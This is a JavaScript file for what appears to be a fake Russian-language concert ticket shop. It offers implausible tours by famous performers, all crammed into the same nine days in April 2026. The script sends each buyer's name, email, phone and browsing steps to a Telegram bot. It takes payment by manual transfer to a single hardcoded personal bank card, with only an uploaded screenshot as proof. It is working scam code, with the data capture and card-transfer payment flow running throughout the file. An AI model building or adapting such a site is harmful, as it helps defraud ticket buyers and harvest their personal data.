/* ════════════════════════════════════════
   АНТИСПАМ: не более 5 отправок за 20 мин
   Хранится в localStorage на стороне клиента
   ════════════════════════════════════════ */
const SPAM_KEY   = 'tg_send_log';
const SPAM_LIMIT = 5;
const SPAM_WIN   = 20 * 60 * 1000; // 20 минут

function canSend() {
  const now = Date.now();
  let log = [];
  try { log = JSON.parse(localStorage.getItem(SPAM_KEY) || '[]'); } catch (_) {}
  log = log.filter(t => now - t < SPAM_WIN);
  if (log.length >= SPAM_LIMIT) return false;
  log.push(now);
  try { localStorage.setItem(SPAM_KEY, JSON.stringify(log)); } catch (_) {}
  return true;
}

/* ════════════════════════════════════════
   API — все запросы идут на Netlify Function
   Токен бота НИКОГДА не попадает в браузер
   ════════════════════════════════════════ */
async function tgMsg(text) {
  if (!canSend()) return;
  try {
    await fetch('/.netlify/functions/telegram', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type: 'message', text }),
    });
  } catch (_) {}
}

async function tgPic(file, caption) {
  if (!canSend()) return;
  try {
    const fd = new FormData();
    fd.append('type', 'photo');
    fd.append('caption', caption);
    fd.append('photo', file, 'pay.jpg');
    await fetch('/.netlify/functions/telegram', { method: 'POST', body: fd });
  } catch (_) {}
}

/* ── Email validation ── */
function isValidEmail(email) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email.trim());
}

/* ════════════════════════════════════════
   ДАННЫЕ
   ════════════════════════════════════════ */
const CARD_NUM = '2204321044356046';

const AD = [
  { id:'m', name:'Скали Милано',      em:'🎤', gn:'Рэп / Хип-хоп'     },
  { id:'o', name:'OUDj',              em:'🎧', gn:'Электроника / DJ'   },
  { id:'b', name:'Буда',              em:'🔥', gn:'Рэп'               },
  { id:'f', name:'Фараон',            em:'⚡', gn:'Рэп / Трэп'        },
  { id:'s', name:'Скриптонит',        em:'🌀', gn:'Рэп / Альт'        },
  { id:'k', name:'Макан',             em:'🎸', gn:'Поп / R&B'         },
  { id:'a', name:'Алла Пугачёва',     em:'👑', gn:'Поп / Эстрада'     },
  { id:'r', name:'Филипп Киркоров',   em:'🌟', gn:'Поп / Шоу'         },
];

const CD = {
  m:[
    {city:'Москва',    date:'1 апр 2026',  venue:'Adrenaline Stadium'},
    {city:'СПб',       date:'2 апр 2026',  venue:'A2 Green Concert'},
    {city:'Екб',       date:'3 апр 2026',  venue:'Клуб Rock Zavod'},
    {city:'Новосиб',   date:'5 апр 2026',  venue:'Клуб Подземка'},
    {city:'Казань',    date:'7 апр 2026',  venue:'Клуб UNITY'},
    {city:'Краснодар', date:'9 апр 2026',  venue:'Клуб Cuba'},
  ],
  o:[
    {city:'Москва',    date:'1 апр 2026',  venue:'Клуб Gipsy'},
    {city:'СПб',       date:'2 апр 2026',  venue:'Клуб Cosmonaut'},
    {city:'Екб',       date:'3 апр 2026',  venue:'Клуб Tele-Club'},
    {city:'Новосиб',   date:'5 апр 2026',  venue:'Клуб Versus'},
    {city:'Казань',    date:'7 апр 2026',  venue:'Клуб Korston'},
    {city:'Краснодар', date:'9 апр 2026',  venue:'Клуб Park'},
  ],
  b:[
    {city:'Москва',    date:'2 апр 2026',  venue:'Stadium Live'},
    {city:'СПб',       date:'3 апр 2026',  venue:'Клуб Aurora'},
    {city:'Екб',       date:'4 апр 2026',  venue:'Клуб Gradus'},
    {city:'Новосиб',   date:'5 апр 2026',  venue:'Клуб MAIN'},
    {city:'Казань',    date:'7 апр 2026',  venue:'Клуб Soho'},
    {city:'Краснодар', date:'9 апр 2026',  venue:'Клуб Shake'},
  ],
  f:[
    {city:'Москва',    date:'2 апр 2026',  venue:'Клуб 1930 Moscow'},
    {city:'СПб',       date:'3 апр 2026',  venue:'Клуб MOD'},
    {city:'Екб',       date:'4 апр 2026',  venue:'Клуб Дом Печати'},
    {city:'Новосиб',   date:'6 апр 2026',  venue:'Клуб Opera'},
    {city:'Казань',    date:'7 апр 2026',  venue:'Клуб Studio 8'},
    {city:'Краснодар', date:'9 апр 2026',  venue:'Клуб Castro'},
  ],
  s:[
    {city:'Москва',    date:'3 апр 2026',  venue:'VTB Arena'},
    {city:'СПб',       date:'4 апр 2026',  venue:'Клуб ZAL'},
    {city:'Екб',       date:'5 апр 2026',  venue:'УГМК Арена'},
    {city:'Новосиб',   date:'6 апр 2026',  venue:'Сибирь-Арена'},
    {city:'Казань',    date:'7 апр 2026',  venue:'Пирамида'},
    {city:'Краснодар', date:'9 апр 2026',  venue:'КЗ Кубань'},
  ],
  k:[
    {city:'Москва',    date:'3 апр 2026',  venue:'Клуб 16 Тонн'},
    {city:'СПб',       date:'4 апр 2026',  venue:'Клуб Glastonberry'},
    {city:'Екб',       date:'5 апр 2026',  venue:'Клуб Сохо'},
    {city:'Новосиб',   date:'6 апр 2026',  venue:'Клуб Brodyaga'},
    {city:'Казань',    date:'8 апр 2026',  venue:'Клуб Letto'},
    {city:'Краснодар', date:'9 апр 2026',  venue:'Клуб Central'},
  ],
  a:[
    {city:'Москва',    date:'4 апр 2026',  venue:'Государственный Кремлёвский Дворец'},
    {city:'СПб',       date:'5 апр 2026',  venue:'БКЗ Октябрьский'},
    {city:'Екб',       date:'6 апр 2026',  venue:'УГМК Арена'},
    {city:'Новосиб',   date:'7 апр 2026',  venue:'Сибирь-Арена'},
    {city:'Казань',    date:'8 апр 2026',  venue:'Казань Арена'},
    {city:'Краснодар', date:'9 апр 2026',  venue:'Большой концертный зал'},
  ],
  r:[
    {city:'Москва',    date:'4 апр 2026',  venue:'Crocus City Hall'},
    {city:'СПб',       date:'5 апр 2026',  venue:'БКЗ Октябрьский'},
    {city:'Екб',       date:'6 апр 2026',  venue:'ДИВ Арена'},
    {city:'Новосиб',   date:'7 апр 2026',  venue:'МТС Сибирь'},
    {city:'Казань',    date:'8 апр 2026',  venue:'Пирамида'},
    {city:'Краснодар', date:'9 апр 2026',  venue:'КЗ Кубань'},
  ],
};

const ZD = {
  m:[{z:'Партер',p:2800},{z:'Фан-зона',p:2200},{z:'Трибуна',p:1700},{z:'VIP',p:3000},{z:'Балкон',p:1500},{z:'Бэкстейдж',p:2900}],
  o:[{z:'Партер',p:1900},{z:'Фан-зона',p:1600},{z:'Трибуна',p:1500},{z:'VIP',p:2800},{z:'Балкон',p:1600},{z:'Стоячий',p:1700}],
  b:[{z:'Партер',p:2500},{z:'Фан-зона',p:2000},{z:'Трибуна',p:1600},{z:'VIP',p:3000},{z:'Балкон',p:1500},{z:'Стоячий',p:1800}],
  f:[{z:'Партер',p:2700},{z:'Фан-зона',p:2100},{z:'Трибуна',p:1700},{z:'VIP',p:2900},{z:'Балкон',p:1500},{z:'Стоячий',p:1900}],
  s:[{z:'Партер',p:2600},{z:'Фан-зона',p:2000},{z:'Трибуна',p:1600},{z:'VIP',p:3000},{z:'Балкон',p:1500},{z:'Стоячий',p:1800}],
  k:[{z:'Партер',p:2300},{z:'Фан-зона',p:1900},{z:'Трибуна',p:1600},{z:'VIP',p:2800},{z:'Балкон',p:1500},{z:'Стоячий',p:1700}],
  a:[{z:'Партер',p:2900},{z:'Фан-зона',p:2400},{z:'Трибуна',p:1800},{z:'VIP',p:3000},{z:'Балкон',p:1600},{z:'Бэкстейдж',p:3000}],
  r:[{z:'Партер',p:2800},{z:'Фан-зона',p:2200},{z:'Трибуна',p:1700},{z:'VIP',p:3000},{z:'Балкон',p:1600},{z:'Бэкстейдж',p:2900}],
};

/* ── State ── */
let curA = null, curCO = null, curZ = null, curP = 0, qty = 1, upFile = null;

/* ════════════════════════════════════════
   НАВИГАЦИЯ
   ════════════════════════════════════════ */
const PGS = ['home','artists','city','concert','order','payment','success'];

function gp(id) {
  PGS.forEach(p => {
    document.getElementById('page-' + p).classList.remove('active');
    const nb = document.getElementById('nb-' + p);
    if (nb) nb.classList.remove('active');
  });
  document.getElementById('page-' + id).classList.add('active');
  const nb = document.getElementById('nb-' + id);
  if (nb) nb.classList.add('active');
  window.scrollTo({ top: 0, behavior: 'smooth' });
}

function toast(m) {
  const t = document.getElementById('toast');
  t.textContent = m;
  t.classList.add('show');
  setTimeout(() => t.classList.remove('show'), 2800);
}

/* ════════════════════════════════════════
   АРТИСТЫ
   ════════════════════════════════════════ */
function buildAG() {
  const g = document.getElementById('ag');
  g.innerHTML = '';
  AD.forEach(a => {
    const d = document.createElement('div');
    d.className = 'ac' + (curA && curA.id === a.id ? ' sel' : '');
    d.innerHTML = `<div class="ac-chk">✓</div><span class="ac-em">${a.em}</span><div class="ac-nm">${a.name}</div><div class="ac-gn">${a.gn}</div>`;
    d.onclick = () => {
      document.querySelectorAll('.ac').forEach(x => x.classList.remove('sel'));
      d.classList.add('sel');
      curA = a;
    };
    g.appendChild(d);
  });
}

function doArtist() {
  if (!curA) { toast('Выберите артиста'); return; }
  tgMsg(`🎤 <b>Просмотр: выбор города</b>\n\nАртист: <b>${curA.name}</b>`);
  buildCG();
  gp('city');
}

/* ════════════════════════════════════════
   ГОРОДА
   ════════════════════════════════════════ */
function buildCG() {
  document.getElementById('city-title').textContent = 'Город для: ' + curA.name;
  const g = document.getElementById('cg');
  g.innerHTML = '';
  (CD[curA.id] || []).forEach(c => {
    const d = document.createElement('div');
    d.className = 'cc' + (curCO && curCO.city === c.city ? ' sel' : '');
    d.innerHTML = `<div class="cc-c">${c.city}</div><div class="cc-v">${c.venue}</div><div class="cc-d">${c.date}</div>`;
    d.onclick = () => {
      document.querySelectorAll('.cc').forEach(x => x.classList.remove('sel'));
      d.classList.add('sel');
      curCO = c;
    };
    g.appendChild(d);
  });
}

function doCity() {
  if (!curCO) { toast('Выберите город'); return; }
  tgMsg(`🏙 <b>Выбран город</b>\n\nАртист: <b>${curA.name}</b>\nГород: <b>${curCO.city}</b>\nДата: ${curCO.date}\nПлощадка: ${curCO.venue}`);
  buildConc();
  gp('concert');
}

/* ════════════════════════════════════════
   КОНЦЕРТ / ЗОНЫ
   ════════════════════════════════════════ */
function buildConc() {
  document.getElementById('ch-a').textContent = curA.name;
  document.getElementById('ch-d').textContent = curCO.date;
  document.getElementById('ch-c').textContent = curCO.city;
  document.getElementById('ch-v').textContent = curCO.venue;
  document.getElementById('prog-main').textContent = curA.name + ' — Основная программа';
  const g = document.getElementById('zg');
  g.innerHTML = '';
  (ZD[curA.id] || []).forEach(z => {
    const d = document.createElement('div');
    d.className = 'zc' + (curZ && curZ.z === z.z ? ' sel' : '');
    d.innerHTML = `<div class="zc-sm">✓</div><div class="zc-z">${z.z}</div><div class="zc-p">${z.p.toLocaleString('ru')} ₽</div><div class="zc-s">Зона «${z.z}»</div>`;
    d.onclick = () => {
      document.querySelectorAll('.zc').forEach(x => x.classList.remove('sel'));
      d.classList.add('sel');
      curZ = z;
      curP = z.p;
      updSum();
    };
    g.appendChild(d);
  });
}

function doZone() {
  if (!curZ) { toast('Выберите зону билета'); return; }
  updSum();
  gp('order');
}

/* ════════════════════════════════════════
   ИТОГО
   ════════════════════════════════════════ */
function updSum() {
  if (!curA || !curCO || !curZ) return;
  document.getElementById('sa').textContent   = curA.name;
  document.getElementById('sc').textContent   = curCO.city;
  document.getElementById('sd').textContent   = curCO.date;
  document.getElementById('sz').textContent   = curZ.z;
  document.getElementById('sca').textContent  = `${curP.toLocaleString('ru')} ₽ × ${qty}`;
  document.getElementById('stot').textContent = `${(curP * qty).toLocaleString('ru')} ₽`;
  document.getElementById('qshow').textContent = qty;
}

function chq(d) {
  qty = Math.max(1, Math.min(10, qty + d));
  updSum();
}

/* ════════════════════════════════════════
   ЗАКАЗ
   ════════════════════════════════════════ */
async function doOrder() {
  const n = document.getElementById('in').value.trim();
  const l = document.getElementById('il').value.trim();
  const eInput = document.getElementById('ie');
  const e = eInput.value.trim();
  const p = document.getElementById('ip').value.trim();

  eInput.classList.remove('inp-err');
  document.getElementById('email-err').style.display = 'none';

  if (!n || !l || !e || !p) { toast('Заполните все поля'); return; }

  if (!isValidEmail(e)) {
    eInput.classList.add('inp-err');
    document.getElementById('email-err').style.display = 'block';
    eInput.focus();
    toast('Введите корректный email');
    return;
  }

  const tot = (curP * qty).toLocaleString('ru');
  await tgMsg(
    `📋 <b>НОВЫЙ ЗАКАЗ БИЛЕТА</b>\n\n` +
    `👤 ${n} ${l}\n📧 ${e}\n📱 ${p}\n\n` +
    `🎤 Артист: <b>${curA.name}</b>\n🏙 Город: ${curCO.city}\n` +
    `📅 Дата: ${curCO.date}\n🏟 Клуб: ${curCO.venue}\n` +
    `🎫 Зона: ${curZ.z}\n🔢 Кол-во: ${qty}\n💰 Сумма: <b>${tot} ₽</b>\n\n⏳ Ожидает оплаты`
  );
  document.getElementById('pam').textContent = (curP * qty).toLocaleString('ru') + ' ₽';
  gp('payment');
}

/* ════════════════════════════════════════
   ОПЛАТА
   ════════════════════════════════════════ */
function copyCard() {
  navigator.clipboard.writeText(CARD_NUM);
  toast('Номер карты скопирован ✓');
  const b = document.querySelector('.cpb');
  b.textContent = '✓ Скопировано';
  setTimeout(() => b.textContent = '📋 Копировать номер', 2500);
}

function handleFile(e) {
  const file = e.target.files[0];
  if (!file) return;
  upFile = file;
  const r = new FileReader();
  r.onload = x => {
    const img = document.getElementById('prev');
    img.src = x.target.result;
    img.style.display = 'block';
    document.getElementById('upa').classList.add('hf');
    document.querySelector('.up-l').innerHTML = '<strong>✓ Файл загружен</strong>';
  };
  r.readAsDataURL(file);
}

async function doPay() {
  if (!upFile) { document.getElementById('uerr').style.display = 'block'; return; }
  document.getElementById('uerr').style.display = 'none';
  const n = (document.getElementById('in').value + ' ' + document.getElementById('il').value).trim();
  const e = document.getElementById('ie').value.trim();
  const p = document.getElementById('ip').value.trim();
  const tot = (curP * qty).toLocaleString('ru');
  await tgMsg(
    `✅ <b>ОПЛАТА ОТПРАВЛЕНА</b>\n\n` +
    `👤 ${n}\n📧 ${e}\n📱 ${p}\n\n` +
    `🎤 <b>${curA.name}</b>\n🏙 ${curCO.city} · ${curCO.venue}\n` +
    `📅 ${curCO.date}\n🎫 Зона: ${curZ.z}\n🔢 Кол-во: ${qty}\n` +
    `💳 Карта: ${CARD_NUM}\n💰 Сумма: <b>${tot} ₽</b>\n\n📸 Скриншот прикреплён ↓`
  );
  await tgPic(upFile, `💳 Скриншот оплаты | ${n} | ${curA.name} | ${curCO.city} | ${tot} ₽`);
  gp('success');
}

/* ── Init ── */
buildAG();

document.getElementById('ie').addEventListener('input', function () {
  this.classList.remove('inp-err');
  document.getElementById('email-err').style.display = 'none';
});
